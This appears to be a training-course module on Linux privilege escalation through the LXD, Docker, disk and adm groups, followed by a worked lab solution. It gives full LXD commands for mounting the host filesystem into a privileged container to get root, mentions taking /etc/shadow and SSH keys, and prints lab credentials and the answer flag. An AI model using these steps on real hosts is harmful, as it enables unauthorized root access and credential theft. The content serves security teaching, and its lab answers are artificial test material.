
---

## LXC / LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.

```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Unzip the Alpine image.

```shell-session
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Start the LXD initialization process. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

```shell-session
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Import the local image.

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```


```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

---

## Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command creates a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

---

## Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.

---

## ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

---

## Question 1

### "Use the privileged group rights of the secaudit user to locate a flag."

Students first need to connect to `STMIP` with `SSH` using the credentials `secaudit:Academy_LLPE!`:

Code: shell

```shell
ssh secaudit@STMIP
```

  Privileged Groups

```shell-session
┌─[us-academy-1]─[10.10.14.118]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh secaudit@10.129.2.210

The authenticity of host '10.129.2.210 (10.129.2.210)' can't be established.
ECDSA key fingerprint is SHA256:jqHwbeBBQLd/z1BFRM732tTqQbhKGni0KhrGMszsiVM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '10.129.2.210' (ECDSA) to the list of known hosts.
htb-student@10.129.2.210's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic x86_64)

<SNIP>

secaudit@NIX02:~$
```

Students subsequently need to use the `id` command to view the user's group membership:

Code: shell

```shell
id
```

  Privileged Groups

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

Students will notice that the user is part of the `adm` group, which allows reading all of the files under the directory `/var/log/`, thus, students need to use `grep` recursively on the `/var/log/` directory searching for the string "flag" within any file inside it:

Code: shell

```shell
grep -rw "flag" /var/log 2>/dev/null
```

  Privileged Groups

```shell-session
secaudit@NIX02:~$ grep -rw "flag" /var/log 2>/dev/null

/var/log/apache2/access.log:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps! HTTP/1.1" 301 409 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
/var/log/apache2/access.log:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps HTTP/1.1" 404 27847 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Removing the URL-encoded white-space character `%20` from the beginning of the `flag` URL parameter, students will know that the flag is `ch3ck_th0se_gr0uP_m3mb3erSh1Ps!`.